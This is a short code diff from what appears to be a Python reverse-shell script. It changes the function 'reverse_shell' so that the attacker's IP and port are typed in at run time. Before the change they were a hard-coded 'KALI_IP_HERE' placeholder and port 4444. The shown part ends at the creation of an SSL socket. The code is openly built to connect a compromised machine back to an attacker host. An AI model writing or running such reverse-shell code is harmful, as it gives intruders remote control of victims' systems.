@@ -4,8 +4,8 @@ import subprocess
 import os
 
 def reverse_shell():
-    attacker_ip = 'KALI_IP_HERE'
-    attacker_port = 4444
+    attacker_ip = input("Atacker's IP: ")
+    attacker_port = input("Port: ")
 
     # Create an SSL-enabled socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
